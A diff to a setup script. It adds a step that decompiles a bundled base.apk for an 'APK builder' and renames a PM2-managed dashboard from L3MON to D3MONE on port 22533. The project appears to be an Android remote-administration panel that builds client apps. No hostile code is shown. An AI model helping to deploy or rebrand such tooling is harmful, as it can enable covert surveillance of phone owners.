@@ -35,6 +35,19 @@ echo "npm 🛠️ Installing Node.js dependencies..."
 npm install
 npm install socket.io@2.2.0 --save # Force correct version for this codebase
 
+# 4. Decompile base.apk (required for APK builder - decompiled/ is gitignored)
+echo "📦 Decompiling base.apk for APK builder..."
+if [ -f "app/factory/base.apk" ] && [ -f "app/factory/apktool.jar" ]; then
+    if [ ! -d "app/factory/decompiled/smali" ]; then
+        java -jar app/factory/apktool.jar d app/factory/base.apk -o app/factory/decompiled -f
+        echo "✅ base.apk decompiled."
+    else
+        echo "✅ Decompiled directory already exists."
+    fi
+else
+    echo "⚠️ base.apk or apktool.jar not found — APK builder will auto-decompile on first build."
+fi
+
 # 4. Apply EJS Syntax Fixes (Critical for newer EJS versions)
 echo "🛠️ Patching EJS templates for compatibility..."
 find assets/views -name "*.ejs" -exec sed -i "s|<% include \([^'\" ]*\) %>|<%- include('\1') %>|g" {} +
@@ -53,11 +66,12 @@ fi
 echo "🚀 Setting up PM2..."
 sudo npm install pm2 -g
 pm2 delete L3MON 2>/dev/null || true
-pm2 start index.js --name L3MON
+pm2 delete index 2>/dev/null || true
+pm2 start index.js --name D3MONE
 pm2 save
 
 echo "------------------------------------------------"
 echo "✅ Setup Complete!"
 echo "Dashboard: http://127.0.0.1:22533"
-echo "Manage with: pm2 status, pm2 logs, pm2 stop L3MON"
+echo "Manage with: pm2 status, pm2 logs, pm2 stop D3MONE"
 echo "------------------------------------------------"
